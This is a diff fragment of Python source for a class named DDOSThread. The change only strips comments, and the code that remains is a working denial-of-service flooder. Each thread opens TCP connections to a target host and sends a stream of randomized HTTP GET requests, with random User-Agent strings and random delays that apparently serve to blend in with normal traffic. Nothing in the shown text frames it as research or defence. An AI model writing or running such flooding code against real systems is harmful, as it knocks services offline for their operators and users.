@@ -445,24 +445,18 @@ class DDOSThread(threading.Thread):
         self.thread_id = thread_id
 
     def generate_request(self):
-        # Generate a random HTTP request with a random User-Agent
         request = f"GET /{''.join(random.choices(string.ascii_letters, k=10))} HTTP/1.1\r\nHost: {target_host}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n"
         return request.encode()
 
     def ddos(self):
         try:
-            # Create a TCP socket
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.settimeout(timeout)
             client.connect((target_host, target_port))
             for _ in range(max_requests_per_connection):
-                # Generate the request
                 request = self.generate_request()
-                # Send the request
                 client.send(request)
-                # Random delay between consecutive requests
                 time.sleep(random.uniform(min_delay_between_requests, max_delay_between_requests))
-            # Close the connection
             client.close()
         except Exception as e:
             print(f"Thread {self.thread_id} error: {e}")
